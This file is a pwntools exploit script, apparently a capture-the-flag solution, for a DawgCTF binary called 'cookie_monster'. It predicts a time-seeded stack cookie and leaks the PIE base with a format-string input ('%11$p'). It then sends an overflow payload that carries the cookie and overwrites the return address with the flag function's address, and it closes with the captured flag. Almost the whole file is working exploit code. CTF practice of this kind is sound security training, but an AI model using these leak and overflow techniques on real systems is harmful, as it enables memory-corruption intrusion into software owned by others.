from pwn import *

context.binary = elf = ELF('./cookie_monster')
p = remote("ctf.umbccd.io", 4200)
#p = process('./cookie_monster')
t = int(time.time())+1
cookie = int(subprocess.check_output(['./random', str(t)])[:-1])
log.info("Cookie: 0x{:x}".format(cookie))
# gdb.attach(p, '''
#     init-gef
#     pie break *0x1290
# ''')
# p.sendlineafter("what's your name?\n", "%9$p")
# p.recvuntil("Hello, ")
# cookie = int(p.recvline(False),16) >> 32
# log.info("Cookie: 0x{:x}".format(cookie))

p.sendlineafter("what's your name?\n", "%11$p")
p.recvuntil("Hello, ")
pie = int(p.recvline(False),16)-0x134f
elf.address = pie
log.info("PIE: 0x{:x}".format(pie))
payload = "A"*(0x11-0x4)
payload += p32(cookie) + "B"*8+p64(elf.symbols['flag'])
p.sendlineafter("cookie?\n", payload)
p.interactive()
# DawgCTF{oM_n0m_NOm_I_li3k_c0oOoki3s} 
